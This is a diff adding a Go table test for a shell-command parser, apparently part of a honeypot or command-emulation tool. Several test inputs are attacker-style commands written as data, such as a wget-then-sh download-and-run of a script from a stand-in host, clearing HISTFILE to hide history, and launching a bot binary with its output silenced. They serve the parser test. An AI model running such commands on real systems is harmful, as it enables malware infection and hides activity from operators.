@@ -35,3 +35,36 @@ func TestRunNewlineSeparatedCommands(t *testing.T) {
 		t.Fatalf("expected two statements, got %q", out)
 	}
 }
+
+func TestParseCommands(t *testing.T) {
+	cases := []struct {
+		in        string
+		wantNames []string
+		wantArgs0 []string
+	}{
+		{"uname -a", []string{"uname"}, []string{"-a"}},
+		{"/bin/./uname -s -m", []string{"uname"}, []string{"-s", "-m"}},
+		{"cd /tmp; wget http://x/a.sh && sh a.sh", []string{"cd", "wget", "sh"}, []string{"/tmp"}},
+		{"cat /proc/cpuinfo | grep name | wc -l", []string{"cat", "grep", "wc"}, []string{"/proc/cpuinfo"}},
+		{"LC_ALL=C HISTFILE=/dev/null ls -la", []string{"ls"}, []string{"-la"}},
+		{"cd /tmp\n./bot.x86 > /dev/null 2>&1", []string{"cd", "bot.x86"}, []string{"/tmp"}},
+		{"'/usr/bin/id'", []string{"id"}, []string{}},
+		{"FOO=bar", nil, nil},
+		{"   ", nil, nil},
+	}
+	for _, tc := range cases {
+		t.Run(tc.in, func(t *testing.T) {
+			got := ParseCommands(tc.in)
+			var names []string
+			for _, c := range got {
+				names = append(names, c.Name)
+			}
+			if !reflect.DeepEqual(names, tc.wantNames) {
+				t.Fatalf("names = %q, want %q", names, tc.wantNames)
+			}
+			if len(got) > 0 && !reflect.DeepEqual(got[0].Args, tc.wantArgs0) {
+				t.Fatalf("args[0] = %q, want %q", got[0].Args, tc.wantArgs0)
+			}
+		})
+	}
+}
